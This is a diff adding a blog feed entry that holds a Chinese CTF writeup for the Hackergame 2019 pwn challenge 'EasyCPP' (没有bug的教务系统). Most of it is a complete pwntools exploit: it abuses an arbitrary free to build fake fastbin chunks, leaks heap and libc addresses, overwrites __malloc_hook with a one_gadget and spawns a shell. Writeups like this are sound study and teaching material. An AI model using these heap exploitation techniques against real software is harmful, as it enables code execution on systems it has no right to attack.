@@ -4,6 +4,27 @@
   
     
     <entry>
+      <title>hackergame2019 没有bug的教务系统 Writeup</title>
+      <link href="/2019/11/02/hackergame2019-easyCPP-wp/"/>
+      <url>/2019/11/02/hackergame2019-easyCPP-wp/</url>
+      
+        <content type="html"><![CDATA[<p>中科大hackergame2019里 没有bug的教务系统 的writeup</p><a id="more"></a><p>先引用一下官方的wp</p><blockquote><p><a href="https://github.com/ustclug/hackergame2019-writeups/tree/master/official/%E6%B2%A1%E6%9C%89_BUG_%E7%9A%84%E6%95%99%E5%8A%A1%E7%B3%BB%E7%BB%9F" target="_blank" rel="noopener">官方writeup</a></p></blockquote><h1 id="核心思路"><a href="#核心思路" class="headerlink" title="核心思路"></a>核心思路</h1><p>即利用edit info中 v5的任意地址free</p><h1 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h1><p>核心就在于editInfo()以及setPassword()<br><img src="https://i.loli.net/2019/11/02/UYhXblJrTtVEcjP.png" alt="setPassword"><br><img src="https://i.loli.net/2019/11/02/BXERUAtxlVcLGH7.png" alt="editInfo"><br>setPassword()中的s[]距editInfo()中v5的偏移为0x80<br><img src="https://i.loli.net/2019/11/02/2pTde9CLxwOEmAy.jpg" alt="setPassword"></p><p><img src="https://i.loli.net/2019/11/02/3REaMuLSAfpOz57.jpg" alt="editInfo"></p><blockquote><p>偏移量 = 0x7ffd3a074ba0 - 0xB0 - 0x7ffd3a074ba0 + 0x30  = - 0x80</p></blockquote><p>具体过程见EXP的注释 </p><h1 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h1><pre><code class="python">#encoding:utf-8from pwn import *password = &#39;\x44\x00\x02\x41\x43\x47\x10\x63\x00&#39;one_gadget_offset = 0xf02a4pswd_addr = 0x6032E0context.log_level = &#39;DEBUG&#39;elf =ELF(&#39;./EasyCPP&#39;)pswd = map(lambda x:ord(x) , list(password))ans = &#39;&#39;#sh = process(&#39;./EasyCPP&#39;)for i in reversed(range(8)):    for x in range(256):        if(pswd[i] == (((x | pswd[i + 1]) &amp; ~(x &amp; pswd[i + 1]) | i) &amp; ~((x | pswd[i + 1]) &amp; ~(x &amp; pswd[i + 1]) &amp; i))):            pswd[i] = x            breakans = &#39;&#39;.join(map(lambda x : chr(x) , pswd) )def edit(ps , stu):    sh.sendlineafter(&#39;Please tell me your choice:&#39;,&#39;1&#39;)    sh.sendafter(&#39;Your new password:&#39;,ps)    sh.sendafter(&#39;please:&#39;,stu)    sh.sendlineafter(&#39;grade(0~100):&#39;,&#39;0&#39;)    sh.sendlineafter(&#39;grade:&#39;,&#39;0&#39;)    sh.sendlineafter(&#39;grade:&#39;,&#39;0&#39;)    sh.sendlineafter(&#39;grade:&#39;,&#39;0&#39;)sh = process(&#39;./EasyCPP&#39;)#gdb.attach(sh)sh.recvuntil(&#39;Username:&#39;)sh.sendline(&#39;admin&#39;)sh.recvuntil(&#39;Password:&#39;)sh.send(ans)</code></pre><pre><code class="python">payload = (p64(0) + p64(0x21) + p64(0)*2 +p64(0) + p64(0x21) + p64(0) *2 + p64(0) + p64(0x21) + p64(0) *2).ljust(0x80,&#39;\x00&#39;)payload += p64(0)edit(payload,&#39;a&#39; * 0x20)# 第一次循环是为了将v4 free 置入fastbin中,因此fake chunk其实不必构造# v4是malloc(0x0B) 即 len(&#39;PB19000001&#39;) + 1 实际size = 0x21payload = (p64(0) + p64(0x21) + p64(0)*2 +p64(0) + p64(0x21) + p64(0) *2 + p64(0) + p64(0x21) + p64(0) *2).ljust(0x80,&#39;\x00&#39;)payload += p64(pswd_addr + 0x10)edit(payload,&#39;a&#39;)# 第二次循环 构造size = 0x21的fake_chunk 使得在T-&gt;edit中malloc(1) 得到最小chunk# free(fake_chunk) 再在 T-&gt;edit 中将其malloc出来，且仅修改最低一字节为0x61sh.recvuntil(&#39;STUDENT: &#39;)heap_addr = u64(sh.recvuntil(&#39;GPA:&#39;)[:-4].ljust(8,&#39;\x00&#39;))log.info(&#39;heap_addr = &#39; + hex(heap_addr))# 泄露heap地址 偏移固定payload = (p64(0) + p64(0x21) + p64(0)*2 +p64(0) + p64(0x21) + p64(0) *2 + p64(0) + p64(0x21) + p64(0) *2).ljust(0x80,&#39;\x00&#39;)payload += p64(heap_addr - 0x41)edit(payload ,p64(elf.got[&#39;setvbuf&#39;]))sh.recvuntil(&#39;STUDENT: &#39;)# 第三次循环 heap_addr - 0x41 = 程序开始时malloc(0x18)的T所在chunk ,fd 即为studentNum# 先将其free再在T-&gt;edit 中将其malloc出来 修改studentNum为got表地址 即可获得libc地址 libc题目已给出 偏移量已知libc_setvbuf_addr = u64(sh.recvuntil(&#39;GPA:&#39;)[:-4].ljust(8,&#39;\x00&#39;))libc_base = libc_setvbuf_addr - 0x6fe70log.info(&#39;libc_base_addr =&#39; + hex(libc_base))one_gadget = libc_base + one_gadget_offsetfind_fake_fast_offset = 0x23malloc_hook_offset = 0x3C4B10payload = p64(0) + p64(0x71) + p64(libc_base + malloc_hook_offset - find_fake_fast_offset) +p64(0) * 11 + p64(0) + p64(0x21) + p64(pswd_addr + 0x10) + p64(0)*2 #+ &#39;\x21&#39;edit(payload,&#39;a&#39; * 0x30)# 第四次循环, 构造fake_chunk size = 0x71 用于寻找find_fake_fast# 这次循环 仅为了将bss段上的pswd地址free进fastbin链中 fd会被置0</code></pre><pre><code class="python">payload = p64(0) + p64(0x71) + p64(libc_base + malloc_hook_offset - find_fake_fast_offset) +p64(0) * 11 + p64(0) + p64(0x21) + p64(0) + p64(0)*2 #+ &#39;\x21&#39;edit(payload,&#39;\x00&#39; * 0x60)# 第五次循环 UAF 修改刚刚被free的fake chunk 的fd = fake_fast 然后将其malloc 此时已不必利用free(v5) 因此是p64(0)payload = p64(0) + p64(0x71) + p64(libc_base + malloc_hook_offset - find_fake_fast_offset) +p64(0) * 11 + p64(0) + p64(0x21) + p64(0) + p64(0)*2 #+ &#39;\x21&#39;edit(payload,&#39;a&#39; * 0x13 + p64(one_gadget) + &#39;\x00&#39; * 69)# 最后一次循环 malloc fake_fast a*0x13 是算上了 find_fake_fast的chunk头0x10 修改malloc_hook 为one_gadgetsh.sendlineafter(&#39;Please tell me your choice:&#39;,&#39;1&#39;)sh.sendline(&#39;1234&#39;)sh.interactive()</code></pre>]]></content>
+      
+      
+      
+        <tags>
+            
+            <tag> ctf </tag>
+            
+            <tag> pwn </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>iChunQiu 巅峰极客2019 pwn snote Writeup</title>
       <link href="/2019/10/19/iChunQiu-%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A22019-pwn-snote-Writeup/"/>
       <url>/2019/10/19/iChunQiu-%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A22019-pwn-snote-Writeup/</url>
